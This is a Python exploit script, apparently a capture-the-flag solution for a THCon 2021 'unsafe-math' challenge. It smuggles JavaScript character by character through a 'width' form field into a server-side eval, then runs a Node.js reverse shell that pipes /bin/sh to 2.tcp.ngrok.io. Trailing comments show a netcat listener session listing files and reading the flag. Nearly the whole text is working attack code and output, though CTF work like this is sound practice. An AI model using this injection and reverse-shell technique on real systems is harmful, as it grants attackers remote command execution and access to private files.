#!/usr/bin/env python3

import requests

TARGET_URI = 'http://remote1.thcon.party:10702'
#  TARGET_URI = 'http://localhost:3001'

# This is the JS payload we'll execute and return
# Example payload: `Object.keys(global)`
js_payload = '''
sh = require('child_process').spawn("/bin/sh");
require('net').connect(11785, "2.tcp.ngrok.io", function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
});
'''.replace('\n', '')

def eval(value):
    res = requests.post(TARGET_URI, data = { 'width': value + ')//', 'height': 1 })
    if res.status_code != 200:
        print(res.text)
        raise StandardError
    return res

def exploit():
    eval('p=""')
    for i in range(len(js_payload)):
        char = js_payload[i]
        if char == '"':
            eval("p+='"+char+"'")
        else:
            eval('p+="'+char+'"')
        print(".", end="", flush=True)

    print("\nEvaluating exploit...")
    res=eval('eval(p)')
    print("")
    print(res.text)

exploit()
###
# unsafe-math[master*] $nc -l -p 1337
# ls
# index.js
# node_modules
# package-lock.json
# package.json
# sec9et_fl46.txt
# static
# views
# cat sec9et_fl46.txt
# THCon21{t34cHiN6_1s_N0t_sO_3@sY}
###
